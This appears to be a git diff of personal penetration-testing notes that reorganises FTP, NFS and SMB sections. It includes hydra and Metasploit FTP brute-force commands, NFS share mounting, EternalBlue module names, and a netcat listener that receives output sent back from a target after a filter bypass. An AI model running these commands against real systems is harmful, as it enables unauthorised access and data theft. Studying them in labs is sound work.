@@ -49,33 +49,6 @@ sudo nmap -sL 172.16.1.0/24
 fping -a -g 172.16.0.0/16 2>/dev/null
 
 ```
-
-```jsx
-ftp> ls
-229 Entering Extended Passive Mode (|||5417|)
-ftp> passive off
-This will fix it . 
-```
-
-### Services :
-
-**FTP :** 
-
-```bash
-#Brute Force :
-hydra -t64 -L ../Wordlist/users -P ../Wordlist/passwd ftp://172.16.1.101
-auxiliary/scanner/ftp/ftp_login 
-set PASS_FILE passwords.txt
-set USER_FILE users.txt
-set RHOSTS 172.16.1.101
-run
-# Issues : 
-ftp> ls
-229 Entering Extended Passive Mode (|||5417|)
-ftp> passive off
-This will fix it . 
-```
-
 ## Web Application :
 
 ### Crawling :
@@ -354,6 +327,52 @@ hashcat -r /usr/share/hashcat/rules/best66.rule
 
 ## Some Services : 
 
+### FTP :
+
+```bash
+#Brute Force :
+hydra -t64 -L ../Wordlist/users -P ../Wordlist/passwd ftp://172.16.1.101
+auxiliary/scanner/ftp/ftp_login 
+set PASS_FILE passwords.txt
+set USER_FILE users.txt
+set RHOSTS 172.16.1.101
+run
+
+# Issues : 
+ftp> ls
+229 Entering Extended Passive Mode (|||5417|)
+ftp> passive off
+This will fix it .
+
+```
+
+### NFS : 
+
+```bash
+# This is found on book.hacktricks.wiki 
+
+nmap -sV -script=nfs-shomount $target -v 
+
+showmount -e $target : It will list all mounted shares . 
+
+mkdir /tmp/mntfolder  : folder to store the file we will be mounting . 
+
+mount -t nfs '[-o vers=2]' $target:/users(name of the drive to mount) /tmp/mnt/folder . 
+
+# On ZSH : 
+
+ sudo mount -t nfs -o vers=3,nolock 10.10.9.11:/users mnt/userss/
+
+```
+
+### SMB  :
+
+```bash
+search ms17-010
+exploit/windows/smb/ms17_010_eternalblue : SMB v1
+exploit/windows/smb/ms17_010_psexec : SMB v2
+```
+
 ### PFSense :
 
 ```bash
@@ -370,16 +389,8 @@ Now on our machine we do : nc -lnvp 9001 > filesystem.txt
 This will output the command result from the find command onto the filesystem.txt file . 
 #The ${HOME} is just a / since the / is banned , we used that to bypass it 
 Since we did env command  from earlier and we go that $HOME is / . 
-
 ```
 
-### SMB Exploitation :
-
-```bash
-search ms17-010
-exploit/windows/smb/ms17_010_eternalblue : SMB v1
-exploit/windows/smb/ms17_010_psexec : SMB v2
-```
 
 ## Post Exploitation :
 
